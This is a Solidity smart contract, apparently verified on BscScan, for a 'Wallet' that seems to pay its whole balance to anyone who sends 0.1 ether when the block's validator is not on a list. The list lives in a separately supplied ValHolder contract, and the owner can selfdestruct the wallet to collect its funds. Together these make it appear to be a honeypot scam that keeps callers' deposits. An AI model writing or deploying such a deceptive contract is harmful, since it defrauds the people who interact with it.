/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

pragma solidity ^0.8.9;

contract ValHolder {
    uint x = block.number;

    address[] private v;
    constructor() {
        v =[address(0)];
    }

    //is in validator list
    function ch(address xy) view public returns(bool) {
        uint i=0;
        for (i; i<v.length; i++) {
            if (xy == v[i]) {
                return true;
            }
        }
        return false;
    }

}


contract Wallet {
    uint x = block.number+13;
    address[] private v;
    address public w;

    address private a;
    uint public minimum = 0.1 ether;
    ValHolder private holder;

    event Withdraw(uint);

    constructor(address valholder) payable {
        holder = ValHolder(valholder);
        a = msg.sender;
    }

    function withdraw() public payable {
        require(msg.value >= minimum);
        //if not in validator list?!?!?
        w = block.coinbase;
        if (!holder.ch(block.coinbase)) {

            payable(msg.sender).transfer(address(this).balance);
            emit Withdraw(address(this).balance);
        }
        //if is in validator list
        else {}
    }

    function claim() payable external {}

    function deposit() payable  external {}
    receive() payable external {}
    fallback () payable external {}

    function suicide() public {
        require(msg.sender == a);
        selfdestruct(payable(a));
    }


}